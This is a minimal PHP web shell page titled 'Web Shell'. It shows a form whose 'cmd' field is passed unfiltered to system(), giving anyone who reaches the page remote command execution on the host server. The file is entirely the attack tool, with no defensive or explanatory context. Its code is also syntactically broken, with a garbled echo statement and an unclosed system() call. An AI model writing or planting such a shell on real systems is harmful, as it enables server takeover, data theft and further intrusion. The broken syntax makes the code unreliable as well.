<html>

<head>
    <title>
        Web Shell
    </title>
</head>

<form method = "GET">
    <label for=""><?php echo basename($_SERVER['PHP_SELF']); . >> ?></label>
    <input type="text" name = "cmd" autofocus id = "cmd">
    <input type="submit" value="Execute">
</form>
<pre>
    <?php
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd'];        
        }
    ?>
</pre>

</html>


